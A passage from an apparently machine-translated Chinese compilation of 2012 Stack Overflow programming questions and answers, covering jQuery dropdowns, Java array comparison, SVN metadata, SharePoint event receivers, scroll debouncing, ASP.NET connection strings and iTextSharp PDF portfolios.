$(document).ready(function() {
    $("select").change(function() {
        var sel = "";
    $(".option-select option:selected").each(function () {
       sel += $(this).text() + " ";
    });
    $(".result").empty().append(sel);
    }); 
}); 
```

有没有办法可以否定每个下拉列表的第一个条目？由于它是“选择...”或“选择一个...”值，我想阻止它显示，因为它是选择中的第一个值。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:18:17.040

```
$(document).ready(function() {
    var newLI = '';
    $("select option:selected").each(function() {           
           newLI += '<li>' + $(this).text() + "</li>";              
    });
    $('ulselector').append(newLI);
});​ 
```

编辑：

您可以在每个下拉列表中收听更改并在每次更改时重新更新列表

```
$(document).ready(function() {        
    $('select').change(function(){ // <-- bind change event handler to the drop downs
        var newLI = '';
        $("select option:selected").each(function() {   // <-- then iterate each time it changes   
              newLI += '<li>' + $(this).text() + "</li>";              
        });
        $('ulselector').empty().append(newLI); //<-- empty() to remove old list and update with new list
    });
});​ 
```

再次编辑：

您可以检查所选值的索引是否为 0 .. 如果是则不显示

```
$(document).ready(function() {
    $('select').change(function() { // <-- bind change event handler to the drop downs
        var newLI = '';

        $("select option:selected").each(function() { // <-- then iterate each time it changes   
            if ($(this).index() !== 0) { // <-- only if not default
                newLI += '<li>' + $(this).text() + "</li>";
            }    
            $('ul').empty().append(newLI); //<-- empty() to remove old list and update with new list
        });
    });
}); 
```

[http://jsfiddle.net/wirey00/bKWpg/](http://jsfiddle.net/wirey00/bKWpg/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:16:43.643

```
$("select option[selected]").each(function(i,e) {
            $("ul#list").append("<li>"+$(e).val()+"</li>");})​; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T16:20:34.283

```
var selectedArr = [];
var $ul = $('<ul />');
selectedArr = $("select option[selected=selected]").map(function() {
    return this.value
}).get();
$.each(selectedArr, function() {
   $ul.append('<li>' + this.slice(3));
});
$('body').append($ul); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-17T16:23:01.283

```
$("select option[selected]").each( function() {
        $('<li>', {
             text: $(this).val()
        }).appendTo('ul#list');
}); 
```

# ruby-on-rails - 使用货币宝石的 update_attributeS 转换货币属性

> ID：12009344
> 
> 赞同：0
> 
> 时间：2012-08-17T16:12:06.857
> 
> 标签：ruby-on-rails, currency

请考虑 Product 类的两个对象：

```
class Product < ActiveRecord::Base {
  :id => :integer,
  :name => :string,
  :total_stock => :integer,
  :cents_retail_sale_amount => :integer,
  :cents_cost_amount => :integer,
  :created_at => :datetime,
  :updated_at => :datetime
} 
```

假设我有 2 个对象：

```
 a{
  :id => 12,
  :name => "Shirt",
  :total_stock => 1,
  :cents_retail_sale_amount => 2500,
  :cents_cost_amount => 2100,
  :created_at => Mon, 23 Jul 2012 16:16:33 CDT -05:00,
  :updated_at => Mon, 23 Jul 2012 17:24:15 CDT -05:00}

  b {
  :id => nil,
  :name => "Polo Shirt",
  :total_stock => 1,
  :cents_retail_sale_amount => 2500,
  :cents_cost_amount => 2100,
  :created_at => Mon, 23 Jul 2012 16:16:33 CDT -05:00,
  :updated_at => Mon, 23 Jul 2012 17:24:15 CDT -05:00} 
```

现在这是我想要做的：

```
a.update_attributes(b.to_product.attributes.except("id", "created_at", "updated_at") 
```

但是问题（我发现这只是因为我对美分字段进行了验证 - 只允许金额在 0 到 100 美元（10000 美分）之间），是这样的 - 我的美分字段也会更新并在最后获得额外的 00 - 所以我得到 2500 美元和 2100 美元的零售和成本金额。虽然利润率非常高——但并不现实。

我显然可以在更新属性之前对 b 对象进行某种处理（例如不更新货币字段并单独进行），但这并不是很有效。所以我想知道我是否做错了什么

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:44:02.737

我改用[https://github.com/RubyMoney/money-rails](https://github.com/RubyMoney/money-rails) gem 解决了这个问题

# php - 如何将响应从 php 服务器发送到 iphone？

> ID：12009347
> 
> 赞同：0
> 
> 时间：2012-08-17T16:12:37.503
> 
> 标签：php, objective-c, http-headers, response

在服务器中，我正在接收请求，使用数据库对其进行处理并根据需要重定向到新页面。但是如果出现故障，我不知道如何将错误消息发送到应用程序。在应用程序中，我们使用“NSHTTPURLResponse 选择器”状态码”。

我尝试将响应作为状态码发送，

```
header('HTTP Error',true,404); //it works 
```

但是，我需要知道如何使用 httpresponse 或者有没有最好的方法在 php 中发送响应？

提前致谢！

# java - 数组等于忽略顺序

> ID：12009357
> 
> 赞同：37
> 
> 时间：2012-08-17T16:13:40.160
> 
> 标签：java, arrays, equals

> **可能重复：**
> [Java：检查数组是否相等（顺序无关紧要）](https://stackoverflow.com/questions/10154305/java-checking-equality-of-arrays-order-doesnt-matter)

我有两个数组：

```
String[] a1 = {"a", "b", "c"};
String[] a2 = {"c", "b", "a"}; 
```

**无论元素的顺序如何，**我都需要检查两者是否包含相同的元素（并且长度相同）。

我试过`Arrays.equals(a1, a2)`了，但它考虑了元素的顺序。 `org.apache.commons.lang.ArrayUtils`不提供这个东西。

我知道我可以通过创建自己的方法来实现相同的目的（检查相同的长度，然后对数组进行排序，然后使用`Arrays.equals(a1, a2)`），但想知道这个东西是否在任何 API 中提供，或者有更聪明的方法来做同样的事情。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-08-17T16:19:40.583

如果您在从 Collection 继承的东西中拥有这些数组，则可以`collection.containsAll( otherCollection )`从 Collection 接口中使用。但是，您还需要比较两者的长度，以验证一组不是另一组的超集。

（感谢 Aardvarkk 和 piegames。）

[http://docs.oracle.com/javase/6/docs/api/java/util/Collection.html#containsAll(java.util.Collection)](http://docs.oracle.com/javase/6/docs/api/java/util/Collection.html#containsAll(java.util.Collection))

注意：这将在一定程度上起作用。这被定义为检查存在的任何元素*中的至少一个*。也就是说，如果您在一个集合中有 3 个`a`值，而在另一个集合中有 7 个`a`值，则*不一定*会导致它称它们不相等。

例子：

```
[a, b, c] == [c, a, b]             // Works -- Mixed order
[a, b, c, d, d] == [a, b, d, c, d] // Works -- Mixed order with repeats
[a, b, c, d, d] == [a, b, b, c, d] // FAILS -- Different repeats
[a, b, c, d, d] != [a, b, c, d]    // Works -- Length differs with repeats
[a, b, c, d] != [a, b, c]          // Works -- Length differs
[a, b, d] != [a, b, c]             // Works -- Disjoint sets 
```

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2012-08-18T05:45:55.393

我认为它可能对你有用，对第一个数组进行排序

```
Arrays.sort(Object[]); 
```

然后你可以比较

```
Arrays.equals(Object[],Object[]); 
```

完整的代码是：

```
String[] a1 = {"a", "b", "c"};
String[] a2 = {"c", "b", "a"};
Arrays.sort(a2);

boolean result= Arrays.equals(a1, a2); 
```

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2012-08-17T16:18:46.853

在比较它们之前将列表转换为集合：

```
new HashSet( Arrays.asList( a1 )).equals( new HashSet( Arrays.asList( a2 ) )); 
```

或者，您可以使用对数组进行排序，`Arrays.sort()`但这可能会破坏代码，这取决于数组中元素的顺序。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-17T16:23:18.173

使用`java.util.Set`方法`equals`。比较两个具有相同大小的集合，并且指定集合的​​每个成员都包含在另一个集合中。

# svn - fedora17 svn 1.7.5 条目只有一个数字 12

> ID：12009360
> 
> 赞同：0
> 
> 时间：2012-08-17T16:13:59.510
> 
> 标签：svn, fedora

使用 svn 1.7.5 版签出一个项目。我发现只有在顶层目录有一个 .svn 子目录。并且其他子目录中没有 .svn。

我还发现 .svn/entries 文件中只有一个数字 12。没有网址或其他信息。

当我运行 svn update 时，信息是“正在更新”。”。那么，我怎样才能找到网址？有什么错误吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:24:10.080

从 Subversion 1.7 开始，无处不在的`.svn`文件夹已从*除根*目录之外的所有目录中删除。这些一直是*不看*目录。他们被认为充满了魔法并且[不包含用户可维修的部件](http://blog.makezine.com/2005/08/23/no-user-serviceable-parts/)。

我们最终弄清楚了它包含的内容及其格式，许多人用戳戳来找出他们想要的信息。Subversion 1.7 中的所有这些都消失了。

Subversion 有一大堆命令，可以准确地为您提供所需的信息。该`svn info`命令将告诉您当前的修订版、最新修订版、最后更改的人员、根 URL、当前工作目录等。几乎所有您要询问的内容。该`--xml`标志甚至以 XML 格式输出此信息，这使得脚本易于解析。

要获取所有 Subversion 命令的列表，请使用`svn help`. 您需要知道的一切都可以通过这些命令获得。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:17:15.360

```
svn info 
```

将给出存储库 URL、修订和上次更改时间

# c# - 更改上传文件的标题 - 事件接收器

> ID：12009362
> 
> 赞同：1
> 
> 时间：2012-08-17T16:14:08.917
> 
> 标签：c#, events, sharepoint, sharepoint-2010, event-handling

好的，所以我有一个用户的请求，我想使用事件接收器来实现它。

基本上她想要的是有一个文档库，用户可以在其中上传文档。每个文档都有一个类似“UserA - Customization.docx”的文件名。现在您可以想象一个用户可以上传许多具有相同名称的文档，所以我们要做的是自动为文件编号。因此，如果 UserA 上传第一个文档，SharePoint 将在名称后添加一个数字，因此文件将被称为“UserA - Customization - 1.docx”，然后他上传第二个文档，它将被称为“UserA - Customization - 2 .docx”。

但是，现在如果 UserB 想要上传他的第一个文档，则必须将其编号为“UserB - Customization - 1.docx”，因此如果它是新文档，则基本上计数器需要重新启动，如果文档名称已经存在，则从最高编号继续。

所以基本上 SharePoint 需要检查当前文档的名称是否存在于列表中，如果它确实在其旁边添加了一个数字，但该数字必须比最高文档大 1，因此它只会增加。

有没有办法做到这一点？有任何想法吗？

到目前为止，这就是我想出的简单更改文件名的方法，将“-xx”添加到文件名中，但这不起作用。

```
public override void ItemAdded(SPItemEventProperties properties) 
{ 
    SPFile spf = properties.ListItem.File; 
    string url = properties.AfterUrl; 

    int positionOfSlash = url.LastIndexOf("/"); 
    string pathBeforeFileName = url.Substring(0, positionOfSlash); 
    string newFileName = createNewFileName(url.Substring(positionOfSlash)); 

    string myNewUrl = pathBeforeFileName + newFileName; 

    DisableEventFiring(); 
    spf.MoveTo(myNewUrl); 

    spf.Update(); 
    EnableEventFiring(); 
} 
static string createNewFileName(string oldFileName) 
{ 
    int positionOfPeriod = oldFileName.LastIndexOf("."); 

    string fileName = oldFileName.Substring(0, positionOfPeriod); 
    string fileExtension = oldFileName.Substring(positionOfPeriod); 

    string newFileName = fileName + "-xx" + fileExtension; 

    return newFileName; 
} 
```

这段代码我哪里出错了？谢谢你的帮助！

编辑：*这是我在 Visual Studio 的控制台应用程序中使用的代码，用于将 EventReceiver 附加到文档库。*

```
using (SPSite site = new SPSite("http://servername:port/subsite1/subsite2/"))
        {

            using (SPWeb web = site.OpenWeb())
            {
                SPList list = web.Lists["My Doc Library"];

                SPEventReceiverDefinition def = list.EventReceivers.Add();
                def.Assembly = "DocumentLibrary_ClassLib, Version=1.0.0.0, Culture=Neutral, PublicKeyToken=611205b34d18f14d";
                def.Class = "DocumentLibrary_ClassLib.EventReceiver";
                def.Type = SPEventReceiverType.ItemAdded;
                def.Update();
            }
        } 
```

编辑＃2：好的，这样的事情怎么样？

```
//this will get just the name of the file without the extension and I will send that to the 
//query builder which will count how many files there are with that name and return
int positionOfPeriod = oldFileName.LastIndexOf(".");
string tempFileName = oldFileName.Substring(0, positionOfPeriod);

SPQuery query = BuildArbitraryQuery(properties.List, "Name", tempFileName, true); 
```

但现在我不太了解 BuildArbitraryQuery 中的查询，我该如何更改它以提供所需的行为？（对不起，如果这是一个完全的菜鸟问题，但我以前从未处理过 C# 和 EventReceivers）
- 看了 BuildArbitraryQuery 一段时间后，我想我明白了，基本上我不需要改变任何东西？因为它接收文件名和列名作为参数，所以应该没问题吧？

此外，由于列表中的项目将类似于 ClientA Request - 3.docx 并且我将文件名发送到 BuildArbitraryQuery 将能够找到部分匹配而不是完整匹配。因此，例如，如果 BuildArbitraryQuery 接收到的文件名是 ClientA Request.docx，它是否能够找到来自该 ClientA 的所有其他请求？那么 ClientA Request - 1.docx、ClientA Request - 2.docx 是否都包含在计算中？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:53:50.380

给你，测试它，它可以工作。

```
/// <summary>
   /// An item was added.
   /// </summary>
   public override void ItemAdded(SPItemEventProperties properties)
   {
       base.ItemAdded(properties);
       SPListItem item = properties.ListItem;

       if (item["Name"] == null)
           return; //or better yet, log

       string oldFileName = item["Name"].ToString();

       SPQuery query = BuildArbitraryQuery(properties.List, "Created By", properties.UserDisplayName, true);

       int count = properties.List.GetItems(query).Count;

       int positionOfPeriod = oldFileName.LastIndexOf(".");
       if (positionOfPeriod == -1)
       {
            fileName = oldFileName;
            fileExtension = "";
        }
       else
       {
             fileName = oldFileName.Substring(0, positionOfPeriod);
             fileExtension = oldFileName.Substring(positionOfPeriod);
        }

       string newFileName = fileName + "-xx" + count.ToString() + fileExtension;

       item["Name"] = newFileName;

       try
       {
           properties.Web.AllowUnsafeUpdates = true;
           EventFiringEnabled = false;

           item.Update();
       }
       finally
       {
           properties.Web.AllowUnsafeUpdates = false;
           EventFiringEnabled = true;
       }
   }

   /// <summary>
   /// Builds an arbitrary SPQuery which filters by a single column value.
   /// </summary>
   /// <param name="list">The list you will run the query against.</param>
   /// <param name="columnDisplayName">The Display Name of the column you want to filter.</param>
   /// <param name="value">The value to filter against.</param>
   /// <returns>A new SPQuery object ready to run against the list.</returns>
   public static SPQuery BuildArbitraryQuery(SPList list, string columnDisplayName, string value, bool deepSearch)
   {
       if (list == null)
           throw new ArgumentNullException("You cannot pass a null list to Helper.BuildArbitraryQuery.");

       if (!list.Fields.ContainsField(columnDisplayName))
           throw new ArgumentException("The SharePoint List \"" + list.Title + "\" does not contain the Field \"" + columnDisplayName + "\".");

       string internalName = list.Fields[columnDisplayName].InternalName;
       SPQuery query = new SPQuery();
       query.Query = "<Where><Eq><FieldRef Name=\"" + internalName + "\"/><Value Type=\"Text\">" + value + "</Value></Eq></Where>";

       if (deepSearch)
           query.ViewAttributes += "Scope='RecursiveAll'";

       return query;
   } 
```

# android - android中有没有类似windows phone opacityMask的技术？

> ID：12009365
> 
> 赞同：2
> 
> 时间：2012-08-17T16:14:43.780
> 
> 标签：android, windows-phone-7

OpacityMask 在 windows phone 应用程序开发中很有用，它可以在更改主题（暗/亮）时轻松更改图标颜色，或者在不同状态下更改控件图标颜色，只需一张图像。android中是否有类似windows phone opacityMask的技术？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T18:26:17.670

不是直接 - 但您可以加载包含图像的位图并组成一个新位图，其中包含该图像的混合结果和一个包含纯色（程序生成）的位图。您可以使用[此处](https://stackoverflow.com/questions/4605325/blending-pixels-from-two-bitmaps)显示的技术。

希望这可以帮助！

# java - 如果数据库尚不可用，如何启动 Hibernate Web 应用程序

> ID：12009366
> 
> 赞同：2
> 
> 时间：2012-08-17T16:14:44.297
> 
> 标签：java, database, hibernate, sessionfactory

如果数据库连接尚不可用，那么设置/设计或简单地配置基于 Hibernate 的 Java Web 应用程序以支持启动（即 sessionfactory 初始化）的最佳方法是什么，但会在很晚的时候。

换句话说，有没有一种简单的方法来处理 Hibernate 服务器应用程序和它的数据库之间的乱序初始化？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T06:29:16.753

我所知道的 。如果您使用外部连接池，并且 hibernate 不负责建立连接，并且另外 hbm2ddl 设置为 none，则 hibernate 在您打开会话之前不应连接到数据库。无论如何，如果由于没有连接而无法打开会话，只要有数据库连接，它就会成功打开新会话。

# javascript - JavaScript 事件处理延迟滚动事件

> ID：12009367
> 
> 赞同：10
> 
> 时间：2012-08-17T16:14:52.670
> 
> 标签：javascript, events

有人可以解释并帮助我吗？我的网页很慢，因为滚动功能正在向下拖动它。我需要添加延迟，但不明白该怎么做。

```
$(window).scroll(handleScroll); 
```

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-08-17T16:22:15.090

您可以编写一个简单的[~~油门~~去抖动函数](http://www.nczonline.net/blog/2007/11/30/the-throttle-function/)来限制每秒处理滚动事件的次数。

```
function debounce(method, delay) {
    clearTimeout(method._tId);
    method._tId= setTimeout(function(){
        method();
    }, delay);
}

$(window).scroll(function() {
    debounce(handleScroll, 100);
}); 
```

这将确保每次调用之间至少有 100 毫秒的间隔`handleScroll`（或者，换句话说，每秒最多调用 10 次）。

* * *

正如 zzzzBov 所指出的，Zakas 所描述的节流函数实际上是一个去抖动函数。不同之处在于 debounce 会丢弃多余的滚动事件，而节流函数应该将它们排队等待稍后处理（但以给定的最大速率）。

在滚动事件的情况下，您不需要真正的节流。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2020-11-30T17:40:22.407

对于滚动，你很可能需要像 Lodash 或 Underscore 这样的油门功能，很好的例子：

```
function throttle(func, timeFrame) {
  var lastTime = 0;
  return function () {
      var now = new Date();
      if (now - lastTime >= timeFrame) {
          func();
          lastTime = now;
      }
  };
} 
```

这是[这个 repo的简单实现](https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore#_throttle)

# version-control - Skydrive 作为版本控制系统

> ID：12009369
> 
> 赞同：0
> 
> 时间：2012-08-17T16:14:59.567
> 
> 标签：version-control, onedrive

是否可以将 Microsoft Skydrive 用作可以签入和签出的源代码控制系统？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-14T22:29:44.553

SkyDrive 不支持签入签出。您可以针对 SharePoint 站点使用 SkyDrive Pro（您可以注册免费的 O365[开发许可证](http://msdn.microsoft.com/en-us/library/fp179924.aspx)），这将为您提供所需的大部分内容，但不会有任何 Visual Studio 集成。

但是，如果您想要的只是能够安全地存储源代码，那么 SkyDrive 就可以了，但您需要将编译后的二进制文件放在其他地方，像[这样](http://blog.kloud.com.au/2013/01/14/using-skydrive-for-source-code/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T07:39:11.357

我找到了一种将它用作一种源代码控制的方法。但不是直接skydrive，但使用svn是可能的。

只需将存储库创建到本地映射目录（自动与网络空间同步）。签入时，源将自动上传到 skydrive

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-22T21:41:18.523

还有使用 Team Foundation Service 的选项：http: [//tfs.visualstudio.com/en-us/tfs-welcome.aspx](http://tfs.visualstudio.com/en-us/tfs-welcome.aspx)

这是一个基于云的 TFS。我使用了演示，它非常好。

# java - 如何为 JComboBox 设置自动换行？

> ID：12009373
> 
> 赞同：0
> 
> 时间：2012-08-17T16:15:08.243
> 
> 标签：java, swing, jcombobox

我想为组合框中的每个项目显示多行文本。如果超过组合框的宽度，单词应该自动转到下一行。如何做到这一点？

```
String meanings;// array which contains pretty long sentences
JComboBox<String> meaningsComboBox=new JComboBox<String>(meanings); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:32:20.397

也许将每个值包装到 html 中会对您有所帮助（此技巧适用于 JLabels），例如[此处](http://docs.oracle.com/javase/tutorial/uiswing/components/html.html)。以另一种方式，我认为，您需要制作自定义渲染器，例如[here](http://docs.oracle.com/javase/tutorial/uiswing/components/combobox.html#renderer)

# javascript - 将 div 动画化到样式表上定义的位置

> ID：12009380
> 
> 赞同：0
> 
> 时间：2012-08-17T16:15:41.413
> 
> 标签：javascript, jquery, css, jquery-animate

我可以使用 JQuery 轻松地将样式表位置的 div 动画到另一个位置，但是有没有简单的方法来做相反的事情？基本上我想避免更改我的样式表，但让 div 从页面开始并动画到正确的位置。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:24:28.057

你可以尝试做这样的事情：

```
var origt = $("#yourdiv").offset().top, origl = $("#yourdiv").offset().left;
$("#yourdiv").css({top:"auto", left:"auto"}); /*or wherever you want them to start*/
$("#yourdiv").animate({top:origt, left: origl}); 
```

希望有帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:19:15.323

您可以使用[`css()`](http://api.jquery.com/css/)jquery 中的函数来获取它们的样式属性吗？它们应该有多宽和多长，并使用这些值对其进行动画处理？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T16:19:35.170

设置 div 的显示：无；

通过 javascript 查找原始位置。

将它们移到可见窗口之外。

将它们改回 display: block;

将它们从当前位置动画化回存储在 JS 中的原始值。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-17T16:20:45.727

我想你在问：可以将类名传递给 jQuery animate，而不是定义 css 属性的对象文字。

```
http://stackoverflow.com/questions/1248542/jquery-animate-with-css-class-only-without-explicit-styles 
```

# pic - PIC16F88、portb.bit6 和 I2C

> ID：12009385
> 
> 赞同：0
> 
> 时间：2012-08-17T16:16:18.507
> 
> 标签：pic, i2c

我的 PIC16F88 有一个奇怪的问题。我有一个通过 I2C 连接的 EEPROM，它可以完美地工作，直到我写入 portb.bit6。从那时起，我开始从我的 EEPROM 中获取垃圾。我尝试明确禁用 Timer 1，它使用 portb.6 进行振荡器输出，但这没有帮助。我尝试从 PIC 引脚（引脚 12）上剪下走线，这样就没有任何物理连接，这没有帮助。我的 C 代码很简单，portb.6 = 0 或 portb.6 = 1。无论哪种方式，通过 I2C 读取 EEPROM 都将永远失败。生成的 ASM 代码看起来不错。这个问题出现在我尝试过的每块板上，所以它没有本地化到一个 PCB。我很迷惑。有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-21T16:42:40.717

事实证明，在写入 portb 中的任何位之前，每次都需要向 SCL 和 SDA 引脚写入零位。FWIW，我是在使用 PIC16F88 的 SSP 外设来进行 I2C 通信，而不是使用它。感谢 Yahoo 小组 Electronics_101 的人员解决了这个难题。

# objective-c - NSString 不画？

> ID：12009387
> 
> 赞同：0
> 
> 时间：2012-08-17T16:16:23.783
> 
> 标签：objective-c, ios, opengl-es, nsstring, eaglview

我正在尝试绘制一个 NSString，但由于某种原因它不会呈现。

```
- (void)renderScene {
    // Make sure we are renderin to the frame buffer
    [EAGLContext setCurrentContext:context];

    glBindFramebufferOES(GL_FRAMEBUFFER_OES, viewFramebuffer);

    // Clear the color buffer with the glClearColor which has been set      
    glClear(GL_COLOR_BUFFER_BIT);

    //Render the game Scene 
    if(gameState == 0){

        //MENU
        [menu renderAtPoint: CGPointMake(0, 0) centerOfImage: NO];

    } else if(gameState == 1){

        //GAMEPLAY

        [bk renderAtPoint: CGPointMake(0, 0) centerOfImage: NO];

        [self drawScore];

        [player draw];

        [squares render];

        [scoreString drawAtPoint: CGPointMake(262, 250) withFont:[UIFont fontWithName:@"TimesNewRoman" size: 1.0f]]; //RIGHT HERE IS THE DRAW STRING

    } else if(gameState ==2){

        //DEATH SCREEN

        [squared renderAtPoint: CGPointMake(0, 0) centerOfImage: NO];

    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-20T08:38:29.160

您正在尝试混合核心图形和 OpenGL。解决此问题的一种简单方法是创建一个子窗口（UIView 或 UILabel），然后在子窗口中设置文本字符串。您也可以设置子视图的透明度。

还有其他方法（例如绘制位图，然后将其用作 OpenGL 纹理，或使用 OpenGL 将字体绘制为位图或轮廓），但它们的工作量更大 - 取决于您的需要。

# asp.net - 使用 webconfig 中的连接字符串而不是数据集属性

> ID：12009388
> 
> 赞同：1
> 
> 时间：2012-08-17T16:16:23.967
> 
> 标签：asp.net, sql-server, vb.net

我使用向导构建了一个数据集并在其中添加了一个连接。

我现在想使用在我的 Web 配置中定义的连接字符串，而不是在数据集中设置的内容。

我有以下代码（我取出了很多你不需要看的东西）

> 部分公共类 downloaditems 继承 System.Web.UI.Page
> 
> ```
> Private dtmboFeed As dsmbo.mboFeedDataTable
> Private tamboFeed As New dsmboTableAdapters.mboFeedTableAdapter
> Private itemCount As Integer = 0
> Private changedItem As Boolean = False
> Private headSource As String
> Private footSource As String
> Private sideSource As String
> Private lastHead As String
> Private lastFoot As String
> Private lastSide As String
> 
> Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
>     feedChecks()
>     If changedItem = True Then
>         If itemCount = "3" Then
>             savetodatabase(headSource, footSource, sideSource)
>         End If
>     End If
> End Sub
> 
> Private Sub checkSite(ByVal URL As String, ByVal Type As String)
> 
>     Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(URL)
>     request.UserAgent = ".NET Framework Test Client"
>     Dim response As System.Net.HttpWebResponse = request.GetResponse()
> 
>     Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
> 
>     Dim sourcecode As String = sr.ReadToEnd()
>     Dim compareHead As Integer
>     Dim compareFoot As Integer
>     Dim compareSide As Integer
> 
>     Select Case Type
>         Case "headSource"
>             headSource = sourcecode
>             compareHead = String.Compare(headSource, lastHead)
>         Case "footSource"
>             footSource = sourcecode
>             compareFoot = String.Compare(footSource, lastFoot)
>         Case "sideSource"
>             sideSource = sourcecode
>             compareSide = String.Compare(sideSource, lastSide)
>     End Select
> 
>     If Not compareHead = "0" Then
>         changedItem = True
>     End If
>     If Not compareFoot = "0" Then
>         changedItem = True
>     End If
>     If Not compareSide = "0" Then
>         changedItem = True
>     End If
> 
>     itemCount = itemCount + 1
> 
> End Sub
> 
> Private Sub feedChecks()
> 
>     Dim lastImport As DateTime
>     dtmboFeed = New dsmbo.mboFeedDataTable
>     dtmboFeed = tamboFeed.GetCode()
> 
>     For Each rFeed As dsmbo.mboFeedRow In dtmboFeed
>         lastImport = rFeed.LastImport
>         lastHead = rFeed.HeaderCode
>         lastFoot = rFeed.FooterCode
>         lastSide = rFeed.SideCode
>     Next
> 
>     If lastImport > System.DateTime.Now.AddDays(1) Then
>         checkSite("http://www.xxx.me/sss/header.html", "headSource")
>         checkSite("http://www.xxx.me/sss/footer.html", "footSource")
>         checkSite("http://www.xxx.me/sss/sidenav.html", "sideSource")
>     Else
>         Exit Sub
>     End If
> 
> End Sub
> 
> Private Sub savetodatabase(ByVal HeaderCode As String, ByVal FooterCode As String, ByVal SideCode As String)
> 
>     dtmboFeed = tamboFeed.GetData()
>     Dim rFeed As dsmbo.mboFeedRow
> 
>     rFeed = dtmboFeed.NewmboFeedRow
> 
>     rFeed.HeaderCode = HeaderCode
>     rFeed.FooterCode = FooterCode
>     rFeed.SideCode = SideCode
>     rFeed.LastImport = System.DateTime.Now
>     rFeed.Verified = "True"
> 
>     dtmboFeed.AddmboFeedRow(rFeed)
>     tamboFeed.Update(dtmboFeed)
> 
>     lblCode.Text = lblCode.Text & "All downloaded"
> 
> End Sub End Class 
> ```

**编辑：**

下面是我根据要求更新的代码。我收到一条错误消息

```
Error   53  Value of type 'String' cannot be converted to 'System.Data.SqlClient.SqlConnection'. 
```

代码：

```
Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        Dim constring As String
        constring = ConfigurationManager.ConnectionStrings("ConnectString").ToString()
        tamboFeed.Connection = constring

        feedChecks()
        If changedItem = True Then
            If itemCount = "3" Then
                savetodatabase(headSource, footSource, sideSource)
            End If
        End If
    End Sub 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-17T16:20:35.853

您可以将连接字符串作为

```
Dim constring as String
constring = ConfigurationManager.ConnectionStrings("YouconnectionStringNameinWebConfig").ConnectionString 
```

现在首先转到您的数据集设计视图，选择表，右键单击 tableAdapter 并将其连接修饰符更改为公共（见下图），现在您可以在代码隐藏中访问适配器连接属性。

```
tamboFeed.Connection = constring 
```

请参阅下图以更改访问修饰符。![在此处输入图像描述](../Images/75620d47df15aaf6b67b97009d344b38.png)

图片参考：[链接](http://weblogs.asp.net/rajbk/archive/2007/05/26/changing-the-connectionstring-of-a-wizard-generated-tableadapter-at-runtime-from-an-objectdatasource.aspx)

**更新的答案：** 问题是您已将连接字符串放在 webconfig 的 AppSettings 部分中，将连接字符串添加到 ConnectionString 部分。见下面的代码

```
 <connectionStrings>     
<add  name="ConnectString" connectionString="data source=server;initial catalog=database;persist security info=False;user id=adsadasda;password=asdsadasd;packet size=4096" />
 </connectionStrings> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-22T11:11:41.980

tamboFeed.Connection 属于 System.data.SqlClient.SqlConnection 类型，因此不能接受字符串赋值。只要将数据集连接修饰符设置为 Public，您就可以在一行中从 web.config 中分配连接字符串，如下所示：

```
tamboFeed.Connection.ConnectionString = ConfigurationManager.ConnectionStrings("YouconnectionStringNameinWebConfig").ConnectionString 
```

# c# - 如何使用 iTextSharp 阅读 PDF 作品集

> ID：12009390
> 
> 赞同：2
> 
> 时间：2012-08-17T16:16:31.080
> 
> 标签：c#, pdf, itextsharp

我在读取 PDF 文件并将页面拆分为单独的 PDF 文档的 C# 应用程序中使用 iTextSharp。它运作良好，但在投资组合的情况下除外。现在我试图弄清楚如何阅读包含两个嵌入式 PDF 文档的 PDF 组合（或集合，因为它们似乎在 iText 中被称为）。我想简单地打开投资组合，枚举嵌入文件，然后将它们保存为单独的简单 PDF 文件。

关于如何以编程方式**创建**PDF 作品集的一个很好的例子，在这里： [Kubrick Collection Example](http://itextpdf.com/examples/iia.php?id=298)

但我还没有看到任何阅读投资组合的例子。任何帮助将非常感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T20:55:06.817

您引用的示例将嵌入文件添加为文档级附件。所以你可以像这样提取文件：

```
PdfReader reader = new PdfReader(readerPath);
PdfDictionary root = reader.Catalog;
PdfDictionary documentnames = root.GetAsDict(PdfName.NAMES);
PdfDictionary embeddedfiles = 
    documentnames.GetAsDict(PdfName.EMBEDDEDFILES);
PdfArray filespecs = embeddedfiles.GetAsArray(PdfName.NAMES);
for (int i = 0; i < filespecs.Size; ) {
  filespecs.GetAsString(i++);
  PdfDictionary filespec = filespecs.GetAsDict(i++);
  PdfDictionary refs = filespec.GetAsDict(PdfName.EF);
